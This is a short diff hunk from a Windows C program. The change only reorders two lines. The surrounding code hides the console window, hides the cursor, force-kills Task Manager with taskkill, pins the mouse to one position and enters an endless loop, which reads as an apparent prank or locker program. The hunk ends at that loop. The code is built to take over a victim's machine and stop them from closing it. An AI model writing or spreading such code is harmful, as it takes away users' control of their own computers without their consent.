@@ -12,8 +12,8 @@
 
 int main()
 {
-	ShowCursor(FALSE);
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowCursor(FALSE);
 	system("taskkill /f /im Taskmgr.exe");
 	SetCursorPos(200, 200);
 	for (;;)
